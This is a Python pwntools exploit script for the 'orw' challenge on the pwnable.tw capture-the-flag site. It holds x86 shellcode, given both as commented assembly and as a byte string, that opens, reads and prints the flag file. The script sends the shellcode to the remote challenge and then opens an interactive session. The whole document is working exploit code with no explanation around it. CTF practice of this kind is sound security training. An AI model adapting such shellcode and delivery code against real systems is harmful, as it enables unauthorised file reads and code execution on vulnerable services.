from pwn import *
#target=process('./orw')
target=remote('chall.pwnable.tw',10001)


'''
xor eax,eax
push eax
push 0x67616c66
push 0x2f77726f
push 0x2f656d6f
push 0x682f2f2f
mov ebx,esp
mov al,0x5
xor ecx,ecx
xor edx,edx
int 0x80
xor ebx,ebx
mov bl,al
mov al,0x3
mov ecx,0x804a1b0
xor edx,edx
mov dl,0x30
int 0x80
mov al,4
mov bl,0x1
int 0x80
'''
shellcode="\x31\xC0\x50\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\x89\xE3\xB0\x05\x31\xC9\x31\xD2\xCD\x80\x31\xDB\x88\xC3\xB0\x03\xB9\xB0\xA1\x04\x08\x31\xD2\xB2\x30\xCD\x80\xB0\x04\xB3\x01\xCD\x80"

target.sendline(shellcode)
print(target.recv())
target.interactive()
